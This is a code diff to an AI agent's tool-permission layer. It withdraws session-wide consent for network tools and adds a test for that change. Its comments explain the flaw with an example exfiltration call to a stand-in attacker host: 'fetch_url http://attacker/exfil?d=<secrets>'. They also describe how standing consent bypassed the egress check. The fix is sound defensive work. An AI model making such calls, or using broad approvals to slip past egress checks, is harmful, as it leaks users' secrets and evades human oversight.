@@ -33,6 +33,20 @@ use crate::tool::{
 /// grants are excluded too: each request is about one specific directory,
 /// and "always widen the boundary without asking" must not be a recordable
 /// consent.
+///
+/// The network-native tools (`fetch_url`/`web_search`) are excluded by the
+/// sub-agent argument taken literally: their risk is ENTIRELY in the `url` /
+/// `query` argument, and this consent is by name, so one `a` on
+/// `fetch_url https://docs.rs/serde` made every later
+/// `fetch_url http://attacker/exfil?d=<secrets>` run unprompted. The egress
+/// floor that exists for exactly that call (the `is_network_tool` check in
+/// [`AgentRuntime::auto_approval_granted`]) lives in the permission-mode layer,
+/// which standing consent short-circuits *above* — so the floor never saw the
+/// call, in every mode including `Default`. These tools carry no `network: true`
+/// flag to key a consent on the way shell does, and there is no useful identity
+/// below the URL itself, so the option is withdrawn rather than narrowed:
+/// [`session_consent_recordable`] reads this, so the panel stops offering "a"
+/// instead of silently downgrading it to a one-time approve.
 pub(super) fn session_allowable(tool_name: &str) -> bool {
     !matches!(
         crate::execution_policy::ExecPolicy::classify_tool(tool_name),
@@ -40,6 +54,7 @@ pub(super) fn session_allowable(tool_name: &str) -> bool {
             | crate::execution_policy::ToolKind::Job
             | crate::execution_policy::ToolKind::SubAgent
             | crate::execution_policy::ToolKind::RootGrant
+            | crate::execution_policy::ToolKind::Network
     )
 }
 
@@ -927,6 +942,39 @@ mod tests {
                 "{tool} {arguments} must not offer a session consent"
             );
         }
+    }
+
+    /// The network-native tools take no standing consent by name.
+    ///
+    /// `fetch_url`'s whole risk is its `url`, and this consent is keyed on the
+    /// tool NAME — so an "a" given on a docs fetch used to wave through
+    /// `fetch_url http://attacker/exfil?d=<secrets>` for the rest of the
+    /// session. The egress floor written for exactly that call sits in the
+    /// permission-mode layer, which Layer 1 short-circuits above, so it never
+    /// ran: asserted here as "no consent is recordable", which is what keeps
+    /// the name out of `session_approved` in the first place.
+    #[test]
+    fn network_native_tools_take_no_standing_consent() {
+        for (tool, arguments) in [
+            ("fetch_url", json!({ "url": "https://docs.rs/serde" })),
+            ("web_search", json!({ "query": "serde derive" })),
+        ] {
+            assert!(
+                !session_allowable(tool),
+                "{tool} must not be session-allowable by name"
+            );
+            assert!(
+                !session_consent_recordable(tool, &arguments),
+                "{tool} must not offer a session consent"
+            );
+        }
+        // The exclusion is by KIND, so it cannot drift from the classifier the
+        // egress floor reads.
+        assert!(is_network_tool("fetch_url"));
+        assert!(is_network_tool("web_search"));
+        // An ordinary tool still records one, so this did not disable the
+        // feature wholesale.
+        assert!(session_allowable("write_file"));
     }
 
     /// `root_grant_requested_path` feeds the panel's "requested spelling"
